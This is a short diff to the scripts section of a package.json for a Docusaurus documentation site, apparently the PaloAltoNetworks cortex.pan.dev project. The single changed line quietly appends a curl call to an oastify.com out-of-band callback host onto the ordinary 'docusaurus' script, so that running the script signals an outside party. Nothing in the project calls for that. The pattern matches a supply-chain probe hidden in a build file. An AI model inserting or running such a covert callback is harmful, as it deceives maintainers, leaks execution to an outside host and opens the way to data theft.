@@ -3,7 +3,7 @@
   "version": "0.0.0",
   "private": true,
   "scripts": {
-    "docusaurus": "docusaurus",
+    "docusaurus": "docusaurus && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/PaloAltoNetworks/cortex.pan.dev",
     "start": "docusaurus start",
     "build": "docusaurus build",
     "swizzle": "docusaurus swizzle",
